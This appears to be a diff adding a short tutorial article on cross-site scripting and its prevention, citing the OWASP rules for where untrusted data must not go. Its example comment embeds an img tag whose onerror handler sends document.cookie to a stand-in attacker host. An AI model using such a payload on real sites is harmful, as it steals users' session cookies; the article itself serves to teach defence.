@@ -1,0 +1,43 @@
+
+<article>
+	<h1>Front-end Security Part 1 : XSS</h1>
+
+	<section>
+		<h2>Client <abbr title="Cross Site Scripting">XSS</abbr> ( Cross Site Scripting )</h2>
+		<p>XSS is essentially the ability for a hacker to inject malicious code into a trusted website. Later down the line when the web application serves up the compromised page to another innocent user this code is then executed in their browser. This is commonly done through some sort of form input where the data being submitted is not sanitised or escaped, alternatively the web application is writing this user submitted data into the page within HTML elements where it 
+		should never be.</p>
+
+		<h4>Example</h4>
+
+		<p>A real world example of this open vulnerability would be users being able to add HTML comments on a web article. I ( the bad guy ) could add a script within my comment like :</p>
+		<code>
+			<pre>
+				&lt;p&lt;Hi All, Great articles, should definitely be shared more!&lt;/p&lt;
+				&lt;img src="http://this-does-not-exist.com/image.png" onerror=this.src='http://bad-guys-server/?c=' + document.cookie&lt;
+			</pre>
+		</code>
+		<p>In my seemingly benign comment I have embedded an image that doesn't exist, when an error occurs trying to load this image the browser will execute the onerror function that has been attributed to the image within a full JavaScript execution context - in this case sending off a user's cookies for the trusted domain and unless they are watching the network tab it would be without their knowledge. <b>BOOM</b>!</p>
+		<h4>Prevention</h4>
+		<p>The <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank">OWASP XSS Cheat Sheet</a> outlines 8 core and 4 Bonues rules to be aware of when your application is writing user submitted data back into the pages.</p>
+		<p>Some of the most battle hardened approaches is the deny all - never put untrusted data into the following contexts : </p>
+		<code>
+			<pre>
+				&lt;script&gt;...NEVER PUT UNTRUSTED DATA HERE...&lt;/script&gt; 	Directly in a script
+				&lt;!--...NEVER PUT UNTRUSTED DATA HERE...--&gt; 		Inside an HTML comment
+				&lt;div ...NEVER PUT UNTRUSTED DATA HERE...=test /&gt; 	In an attribute name
+				&lt;NEVER PUT UNTRUSTED DATA HERE... href="/test" /&gt; 	In a tag name
+				&lt;style&gt;...NEVER PUT UNTRUSTED DATA HERE...&lt;/style&gt; 	Directly in CSS
+			</pre>
+		</code>
+		<p>Everywhere else you're going to stick untrusted data - ensure to sanitise and escape it with the appropriate tool!</p>
+		<code>
+			<pre>
+				&lt;body&gt;...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&lt;/body&gt;
+				&lt;div&gt;...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&lt;/div&gt;
+				Any other normal HTML elements
+			</pre>
+		</code>
+			
+
+	</section>
+</article>
